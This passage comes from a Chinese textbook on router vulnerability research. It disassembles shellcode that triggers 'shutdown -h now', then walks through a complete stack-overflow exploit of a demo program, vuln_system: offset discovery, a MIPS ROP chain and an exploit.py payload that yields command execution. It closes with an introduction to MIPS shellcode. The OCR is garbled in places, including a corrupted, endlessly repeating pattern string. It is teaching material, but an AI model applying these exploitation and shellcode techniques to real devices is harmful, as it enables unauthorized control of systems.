下面这段看似杂乱无章的十六进制数据，实际上是一段 Linux 下可以执行 “shutdown -h now” 命令的代码。

unsigned char code[] = "\x31\xc0\x31\xd2\x50\x66\x68\x2d"
"\x68\x89\xe7\x50\x6a\x6e\x66\xc7"
"\x44\x24\x01\x6f\x77\x89\xe7\x50"
"\x68\x64\x6f\x77\x6e\x68\x73\x68"
"\x75\x74\x68\x6e\x2f\x2f\x2f\x68"
"\x2f\x73\x62\x69\x89\xe3\x52\x56"
"\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

第一次看这段代码会觉得一头雾水，晦涩难懂，但这段代码其实暗藏玄机。要想知道这段代码的用途，可以先将上面的代码使用下面的 Python 脚本写入文件 shell.bin。

源码 translate.py
1 s = "\x31\xc0\x31\xd2\x50\x66\x68\x2d"
2 s += "\x68\x89\xe7\x50\x6a\x6e\x66\xc7"
3 s += "\x44\x24\x01\x6f\x77\x89\xe7\x50"
4 s += "\x68\x64\x6f\x77\x6e\x68\x73\x68"
5 s += "\x75\x74\x68\x6e\x2f\x2f\x2f\x68"
6 s += "\x2f\x73\x62\x69\x89\xe3\x52\x56"
7 s += "\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
8 open('shell.bin', 'w').write(s)

运行 translate.py，会生成 shell.bin 文件。启动 IDA，打开 shell.bin 文件，出现如图 6-22 所示的提示。

揭玛家用路由器 0day 漏洞挖掘技术

 </div>

单击 “OK” 按钮，打开 IDA 反汇编界面，如图 6-23 所示。

 </div>

目前，IDA 没有自动识别这段代码，仍然显示大量数字。接下来，需要让 IDA 识别这段代码。单击选中 “seg000:000000000” 行，使用 IDA 快捷键 “C” 使 IDA 把 “seg000:000000000” 行开始的内容当成代码解析，解析成功后如图 6-24 所示。

 </div>

可以看到，刚刚还让人一头雾水的数字转眼就变成了一段 Linux 下的汇编代码，现在我们就可以通过阅读这段汇编代码了解这段 Shellcode 的具体功能了。在第 7 章中会专门介绍如何编写基于 MIPS 的 Shellcode。

#### 6.3.2 漏洞利用开发过程

本节给出对一个利用具有实际意义的漏洞的实例，帮助读者体会完整的利用过程。漏洞利用开发过程中通常需要遵循如下步骤。

➢ 劫持 PC

确定偏移

确定攻击途径

➢ 构建漏洞攻击数据

这些步骤在各个平台的溢出漏洞利用中均适用。在熟悉这些要点之后，可以合并某些步骤，以加快开发速度。

接下来，我们使用 vuln_system 漏洞例子程序介绍漏洞利用的过程。

# 1. 劫持PC

在 6.2 节中已经介绍了这个漏洞的一些细节，这里简单回顾一下。从源码中可以知道，vuln_system 程序能够让用户输入数据的地方只有 passwd 文件，因此，可以按照如下方式构造输入并执行 vuln_system。

$ python -c "print 'A'*600" > passwd    //将600个“A”写入文件passwd
$ qemu-mips -g 1234 vuln_system

打开 IDA 附加远程进程，按 “F5” 键执行程序，程序立即崩溃，崩溃现场如图 6-25 所示。可以看出，缓冲区溢出发生了。此时，我们已经劫持了 PC。

 </div>

# 2. 确定偏移

在劫持 PC 之后，需要精确计算使用多少字节可以使 PC 指向我们期望的地址。对精确定位偏移，笔者推荐两种方法，其他方法基本上都是异曲同工。

##### 方法一：大型字符脚本

建立大量字符，在这些字符中任取连续 4 位，它的值在整个集合中是唯一的，找出覆盖到 PC 的 4 个字符在字符集中的偏移，就可以实现精确定位。

源码 patternLocOffset.py 生成数据部分

1 a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
2 b = "abcdefghijklmnopqrstuvwxyz"
3 c = "0123456789"
4 def generate(count, output):
    #
    # pattern create
    codeStr = ''
    print '[*] Create pattern string contains %d characters' % count,
    timeStart = time.time()
    for i in range(0, count):
        codeStr += a[i/(26*10)] + b[(i% (26*10)) / 10] + c[i% (26*10) % 10]
    print 'ok!'
    if output:
        print '[+] output to %s' % output,
        fw = open(output, 'w')
        fw.write(codeStr)
        fw.close()
        print 'ok!'
    else:
        return codeStr
    print "[+] take time: %.4f s" % (time.time() - timeStart)

第1行～第3行：定义了3个字符集。

第 4 行：generate() 函数的参数为生成字符集的长度及生成的字符集输出的目标文件。

第 10 行～第 11 行：组织生成的字符集数据。

字符集大致如图 6-26 所示。

根据字符集的生成原理编写脚本 patternLocOffset.py，实现精确定位，示例如下。

~/book-source/stack$.python patternLocOffset.py -c -l 600 -f passwd
[*] Create pattern string contains 600 characters ok!
[+] output to passwd ok!
[+] take time: 0.0021 s

使用 IDA 附加调试 vuln_system 进程，崩溃现场如图 6-27 所示。

劫持 PC 的位置在 0x6E37416E 处，即字符串 “n7An”。继续使用下面的命令搜索该劫持 PC 的字符串的精确偏移。

~/book-source/stack$ python patternLocOffset.py -s 0x6E37416E -l 600
[*] Create pattern string contains 600 characters ok!

褐斑家用路由器 Oday 漏洞挖掘技术

[*] Exact match at offset 412

[+] take time: 0.0012 s

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ak0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac

6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A

f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9

Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ai0Ai1Ai2Ai3Ai4Ai

##### 图6-26

 </div>

 </div>

可以看到，填充 412（0x19C）字节后可精确劫持 PC。

为了验证该值是否正确，可以构造一个偏移数据进行测试，示例如下。

$ python -c "print 'A'*0x19C+'BBBBCCCC'">passwd

毫无悬念，我们成功地劫持了 PC，使它指向 0x42424242（BBBB）处，崩溃现场如图 6-28 所示。

 </div>

##### 方法二：栈帧分析

在熟练掌握 MIPS 体系结构堆栈布局的情况下，需要不断尝试，通过观察函数调用栈布局结合动态调试来确定偏移。

从 buf 到 $ra 的偏移计算如下。

 $$ \begin{array}{l} \text{offset=saved_ra - buf_addr}=-0x4-0x1A0=0x19C \end{array} $$ 

以上结果与“方法一”得出的结果是一致的，如图 6-29 所示。

 </div>

# 3. 确定攻击途径

一般情况下，该漏洞的攻击途径有两个，一个是命令执行，另一个是执行 Shellcode，可以根据漏洞的情况选择使用。下面将介绍如何使用命令执行的方式利用该漏洞。关于利用该漏洞执行 Shellcode 的方法，会在第 7 章详细介绍。

在漏洞程序中有一个函数 do_system_0。虽然从代码中可以看出，do_system_0 函数只能执行 “ls -l” 命令，但是我们可以构造一条 ROP Chain，通过溢出漏洞调用 do_system_0 函数，让 do_system_0 函数能够执行任意命令。要想构造该 ROP Chain，首先需要构造 do_system_0 函数的参数，将两个参数分别装入寄存器 $a0 和 $a1。这里只需要控制寄存器 $a1 即可，因为该参数是命令的字符串地址。

综上，使用 Craig Heffner 编写的 IDA 脚本插件 mipsrop.py 搜索构造合适的 ROP Chain，插件的主要命令如下。命令的详细使用方法可通过 mipsrop.help() 函数查看。

Python> mipsrop.help()
Python> mipsrop.system()
Python> mipsrop.find(instruction_string)
Python> mipsrop.doubles()
Python> mipsrop.stackfinders()
Python> mipsrop.tails()
Python> mipsrop.summary()

使用如下命令搜索到一条指令，具体代码如图 6-30 所示。

Python>mipsrop.stackfinders()

| Address | Action | Control Jump |
|---|---|---|---|
| 0x00401FA0 | addiu $a1,$sp,0x58+var_40 | jr0x58+var_4($sp) |

Found 1 matching gadgets

.text:00401FA0
.text:00401FA4
.text:00401FA8
.text:00401FAC
.text:00401FB0
addiu $a1, $sp, 0x58+var_40
lw $ra, 0x58+var_4($sp)
sltiu $v0, 1
jr $ra
addiu $sp, 0x58

 </div>

从代码中可以看出，只要在“$sp+0x58-0x40”中精心构造堆栈命令字符串，$a1 便可指向命令字符串。在“jr $ra”命令返回时，同样在“$sp+0x58-0x4”地址处让流程跳转到 do_system_0 函数（0x00400554）即可，如图 6-31 所示。

 </div>

# 4. 构建漏洞攻击数据

根据以上分析，可以整理出 ROP Chain，如图 6-32 所示。

 </div>

分析过程已经结束了，下一个重要的步骤就是测试。下面利用 Python 脚本将整个利用过程分析的结果实现，具体如下。

##### 源码 exploit.py

1 #!/usr/bin/env python

据称，用强电器  $ Orav $ 漏洞挖掘技术

#exploit.py
import struct
print ['*] prepare shellcode',
cmd = "sh"  # command string
cmd += "\x00"(4 - (len(cmd) % 4))  # align by 4 bytes
#shellcode
shellcode = "A"*0x19C  # padding buf
shellcode += struct.pack(">L", 0x00401FA0)  # "\x00\x40\x1F\xA0"(PC)
shellcode += "A"*24  # padding before command
shellcode += cmd  # command($al)
shellcode += "B"* (0x3C - len(cmd))  # padding
shellcode += struct.pack(">L", 0x00400590)  # "\x00\x40\x05\x90"
shellcode += "BBBB"  # padding
print 'ok!'
#create password file
print ['+] create password file',
fw = open('passwd', 'w')
fw.write(shellcode) #'A'\*300+\x00'\*10+\BBBB')
fw.close()
print 'ok!'

# 5. 测试过程

在漏洞溢出之前，该程序只能在知道管理员密码的情况下执行 “ls -l” 命令。通过漏洞溢出控制程序以后，就可以执行任意命令了，如图 6-33 所示，执行了 cat 等命令。

 </div>

### 第 7 章 基于 MIPS 的 Shellcode 开发

狭义上的 Shellcode 是指向进程植入的一段用于获取 Shell 的代码。发展至今，Shellcode 已统一指在缓冲区溢出攻击中植入进程的代码。Shellcode 所具备的功能不仅包括获取 Shell，还包括弹出消息框、开启端口、执行命令等。

Shellcode 通常使用汇编语言编写，可最终将其转换成机器可识别的二进制机器码，其内容和长度还会受到很多苛刻的限制，因此开发和调试的难度很高。

在日常应用中，大多数程序都是为了与人进行交互而设计的，如常用的 Word、IE 等。用户可以向 Word 文档输入文字数据，可以向 IE 浏览器输入 URL 来访问网页，这些可以由人控制、可以向程序输入数据的地方，都可能成为 Shellcode 的注入点。常见的缓冲区溢出漏洞可能导致程序脱离正常运行逻辑，使程序跳转到攻击者注入的 Shellcode 执行。

在本章中，会由浅入深地讲解 Shellcode 的编写方法，并使用编写的 Shellcode 通过真实的溢出漏洞得到远程系统控制权。

## 7.1 MIPS Linux系统调用

在 Linux 中实现系统调用时利用了 x86 体系结构中的软件中断。软件中断和我们常说的中断（硬件中断）的不同之处在于，它是通过软件指令触发而并非外设引发的中断，也就是说，这是编程人员开发出来的一种异常（该异常为正常的异常）。具体地讲，就是调用 “int $0x80” 汇编指令，这条汇编指令将产生向量为 0x80 的编程异常。这是在 x86 体系结构下编写 Shellcode 所采用的方法。在 MIPS 中如果没有 “int 0x80” 指令让我们使用 Linux 系统调用，是不是就没有办法完成 Shellcode 的编写了呢？当然不是。没有 0x80 中断，还可以使用药业指令进行系统调用。

syscall 的调用方法为：在使用系统调用 syscall 之前，$v0 保存需要执行的系统调用的调用号，并且按照 MIPS 调用规则构造将要执行的系统调用参数。syscall 调用的伪代码为 “syscall($v0,$a0,$a1,$a2....)”。

源码 exit 系统调用 exit(code) 的例子

1 li $a0,0  #code
2 li $v0,4001  #exit系统调用号
3 syscall #syacall

那么，系统调用号是如何确定的呢？Linux 是一个开源系统，系统中包含了 Linux 实现的源代码，因此，系统调用号可以在 Linux 系统中找到。在演示使用的 debian-装的 debian-mips 3.2.0-4-4k-maltal 系统中，/usr/include/mips-linux-gnu/asm/unistd.h 定义如下。

1/*
2 * Linux o32 style药业areintherangefrom4000to499
3*/
4 #define NR Linux 4000
5 #define NR_syscall ( NR Linux + 0)
6 #define NR exit ( NR Linux + 1)
7 #define NR fork ( NR Linux + 2)
8 #define NR read ( NR Linux + 3)
9 #define NR write ( NR Linux + 4)
10 ---snip---
11/*
12 * Linux 64-bit药业areintherangefrom5000to5999.
13*/
14 #define NR Linux 5000
15 #define NR read ( NR Linux + 0)
16 #define NR write ( NR Linux + 1)
17 ---snip---
18/*
19 * Linux N32药业areintherangefrom6000to6999.
20*/
21 #define NR Linux 6000
22 #define NR read ( NR Linux + 0)
23 #define NR write ( NR Linux + 1)
24 ---snip---

从 unistd.h 头文件的定义中可以看出，有 3 组相同功能的系统调用。第 2 行定义的是 32 位环境系统调用，4000~4999 共 999 个可用系统调用号。而从第 6 行中可以看出，exit 系统的调用号是 “___NR_Linux+1”，即 4001，这就是 exit 的系统调用号为 4001 的原因。由此可以得出，fork 系统调用号为 4002，writet 系统调用号为 4004。根据此方法，后面的系统调用，如 execve/reboot 等，都可以找出来。

#### 7.1.1 write系统调用

在开始编写具有实际价值的 Shellcode 之前，演示一个将字符串输出到终端的 Shellcode 例子，介绍 Shellcode 的基本编写方法，以及如何将 C 语言程序转换成汇编语言程序，并最终提取 Shellcode。

在 Linux 下，系统调用 write 不仅可以将字符输出到屏幕文件，而且可以配合 Socket 进行网络通信。从 write 帮助手册中可以知道，该系统调用需要 3 个参数，分别是文件描述符、输出的字符串的指针、输出的字符串的字节数。

文件描述符不仅仅是文件的句柄。文件描述符 0、1 和 2 分别用于 stdin、stdout、stderr。这些特殊的文件描述符用于读取数据、输出正常数据和输出错误信息。如果 stdout 文件描述符把“ABC\n”输出到终端，那么第 1 个参数的文件描述符应该为 1，第 2 个参数是指向“ABC\n”的指针，最后一个参数用于输出字符串“ABC\n”的长度，这里取 5（包含“\0”）。

下面是使用 write 系统调用的 C 语言代码。

##### 源码 1 write 系统调用的 C 语言代码

1 int main()
2 {
3 char *pstr = "ABC\n";
4 write(1, pstr, 5);
5 }

下面是将 “ABC\n” 输出到 stdout 的 Linux 汇编代码。

##### 源码 2 输出字符串的 Shellcode（write.S）

.section .text
.glob1 start
.set noreorder
start:
addiu $sp,$sp,-32
lui $t6,0x4142
ori $t6,$t6,0x430a
sw $t6,0($sp)
li $a0,1
addiu $a1,$sp,0
li $a2,5
li $v0,4004
syscall

第1行～第4行：定义了一些宏，包括程序入口。

第 5 行：将堆栈抬高，避免造成 Shellcode 执行错误。

第 6 行～第 8 行：用两条指令将 0x4142430a（“ABC\n”）写入临时寄存器 $t6，并将“ABC\n”写入堆栈。

第 9 行：因为 write 的第一参数用 $a0 传递，所以这里将 stdout 文件描述符编号放到寄存器 $a0 中。

第 10 行：将字符串 “ABC\n” 首地址写入 \$a1（write 的第 2 个参数）。

第 11 行：向  $ a_{2} $ 写入输出字符串长度 5。

第 13 行：执行 write 系统调用。

